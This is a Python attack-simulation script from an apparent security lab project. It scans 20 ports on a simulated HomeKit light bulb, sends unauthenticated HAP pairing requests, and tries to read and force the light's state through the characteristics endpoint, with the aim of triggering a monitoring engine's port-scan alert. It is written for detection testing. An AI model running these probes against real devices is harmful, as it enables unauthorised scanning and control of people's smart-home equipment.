"""
Attack Script: HomeKit Device (mDNS / HAP)
==========================================
Target  : HomeKit smart light bulb discovered via mDNS (_hap._tcp.local.)
Default : 127.0.0.1:8080

Attacks performed
-----------------
1. PORT SCAN          — connects to 20 ports rapidly
                        → triggers PORT_SCAN alert in monitoring engine
2. HAP PAIRING PROBE  — sends unauthorised HomeKit pairing requests
                        (POST /pair-setup, POST /pair-verify)
                        → demonstrates unauthenticated pairing surface
3. ACCESSORY ENUM     — probes HomeKit accessory characteristic endpoints
                        → attempts to read/write light state without auth

Run order
---------
  1. python Devices/mDNS/homekit_device.py   (start the device)
  2. python Engines/main.py                  (start monitoring)
  3. python Attacks/attack_homekit.py        (run this script)

Expected monitoring alerts
--------------------------
  [PORT_SCAN]  — more than 10 distinct ports probed within 10 seconds
"""

import socket
import time
import http.client
import json
import sys

# ── CONFIG ────────────────────────────────────────────────────────────────────
# Override with:  python attack_homekit.py <TARGET_IP> [TARGET_PORT]
# Docker example: python attack_homekit.py 172.17.0.4 8080
TARGET_IP    = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
TARGET_PORT  = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
SCAN_TIMEOUT = 0.3
# ─────────────────────────────────────────────────────────────────────────────


def print_banner(title):
    print("\n" + "=" * 60)
    print(f"  {title}")
    print("=" * 60)


# ── ATTACK 1: PORT SCAN ───────────────────────────────────────────────────────
def attack_port_scan():
    print_banner("ATTACK 1: Port Scan")
    print(f"  Target : {TARGET_IP}")
    print(f"  Action : Probing 20 ports to trigger PORT_SCAN detection")
    print(f"  Alert  : PORT_SCAN (>10 distinct ports in 10 seconds)\n")

    ports = [21, 22, 23, 25, 80, 443, 554, 1883, 3000, 5000,
             8000, 8080, 8081, 8443, 8888, 9000, 9090, 51826, 51827, 51828]

    open_ports = []
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(SCAN_TIMEOUT)
        result = sock.connect_ex((TARGET_IP, port))
        status = "OPEN" if result == 0 else "closed"
        if result == 0:
            open_ports.append(port)
        print(f"    Port {port:6d} : {status}")
        sock.close()

    print(f"\n  Scan complete. Open ports found: {open_ports or 'none'}")
    print("  >> PORT_SCAN alert should have fired in the monitoring engine")


# ── ATTACK 2: HAP PAIRING PROBE ──────────────────────────────────────────────
def attack_hap_pairing():
    print_banner("ATTACK 2: Unauthorised HomeKit Pairing Probe")
    print(f"  Target : http://{TARGET_IP}:{TARGET_PORT}")
    print(f"  Action : Sending HAP pair-setup and pair-verify requests")
    print(f"  Goal   : Attempt unauthorised device pairing (no PIN)\n")

    # HAP uses TLV8 encoding. We send a minimal pair-setup M1 request
    # (kTLVType_State = 0x06, value = 0x01 — M1 start request)
    tlv_m1 = bytes([0x06, 0x01, 0x01])   # State = M1

    hap_endpoints = [
        ("POST", "/pair-setup",  tlv_m1, "application/pairing+tlv8"),
        ("POST", "/pair-verify", tlv_m1, "application/pairing+tlv8"),
        ("GET",  "/accessories", None,   "application/hap+json"),
    ]

    for method, path, body, content_type in hap_endpoints:
        try:
            conn = http.client.HTTPConnection(TARGET_IP, TARGET_PORT, timeout=3)
            headers = {
                "Content-Type": content_type,
                "User-Agent": "HomeKit-Attack/1.0",
            }
            if body:
                headers["Content-Length"] = str(len(body))
                conn.request(method, path, body=body, headers=headers)
            else:
                conn.request(method, path, headers=headers)

            resp = conn.getresponse()
            raw  = resp.read()
            print(f"    {method} {path:20s} → {resp.status} {resp.reason}")
            if raw:
                print(f"      Response  : {raw[:80]}")
            conn.close()
        except ConnectionRefusedError:
            print(f"    {method} {path:20s} → Connection refused (device not running?)")
            break
        except Exception as e:
            print(f"    {method} {path:20s} → {type(e).__name__}: {e}")

    print("\n  >> Pairing probe complete. A real device would reject without PIN.")


# ── ATTACK 3: ACCESSORY CHARACTERISTIC READ/WRITE ────────────────────────────
def attack_accessory_enum():
    print_banner("ATTACK 3: Accessory Characteristic Enumeration")
    print(f"  Target : http://{TARGET_IP}:{TARGET_PORT}")
    print(f"  Action : Attempting to read/write light state without auth\n")

    # HAP characteristic endpoints — attempt to read and force light state
    endpoints = [
        ("GET",  "/accessories",            None),
        ("GET",  "/characteristics?id=1.9", None),   # Brightness
        ("GET",  "/characteristics?id=1.8", None),   # On/Off state
    ]

    # Attempt to force the light ON (aid=1, iid=8, value=true)
    write_payload = json.dumps({
        "characteristics": [{"aid": 1, "iid": 8, "value": True}]
    }).encode()

    endpoints.append(("PUT", "/characteristics", write_payload))

    for method, path, body in endpoints:
        try:
            conn = http.client.HTTPConnection(TARGET_IP, TARGET_PORT, timeout=3)
            headers = {
                "Content-Type": "application/hap+json",
                "User-Agent": "HomeKit-Enum/1.0",
            }
            if body:
                headers["Content-Length"] = str(len(body))
                conn.request(method, path, body=body, headers=headers)
            else:
                conn.request(method, path, headers=headers)

            resp = conn.getresponse()
            raw  = resp.read()
            print(f"    {method} {path:35s} → {resp.status}")
            if raw:
                print(f"      Body : {raw[:100]}")
            conn.close()
        except ConnectionRefusedError:
            print(f"    {method} {path:35s} → Connection refused")
            break
        except Exception as e:
            print(f"    {method} {path:35s} → {type(e).__name__}")

    print("\n  >> A real device would require session encryption and auth token.")


# ── MAIN ──────────────────────────────────────────────────────────────────────
def main():
    print("\n" + "#" * 60)
    print("#  AutoSecure Attack Simulation — HomeKit Device           #")
    print("#  Target device : mDNS  _hap._tcp.local. (port 8080)     #")
    print("#  FOR EDUCATIONAL / LAB USE ONLY                         #")
    print("#" * 60)
    print(f"\n  Target IP   : {TARGET_IP}")
    print(f"  Target Port : {TARGET_PORT}")
    print("\n  Docker: find container IP with:")
    print("    docker inspect --format '{{.NetworkSettings.IPAddress}}' autosecure-mdns-homekit-1")
    print("  Or run:  python Attacks/get_docker_ips.py")
    print("\n  Make sure the device and monitoring engine are running first.")
    if "--auto" not in sys.argv:
        input("\n  Press Enter to begin attacks...")

    attack_port_scan()
    time.sleep(1)
    attack_hap_pairing()
    time.sleep(1)
    attack_accessory_enum()

    print("\n" + "=" * 60)
    print("  All attacks complete.")
    print("  Check the monitoring engine output for triggered alerts.")
    print("=" * 60 + "\n")


if __name__ == "__main__":
    main()
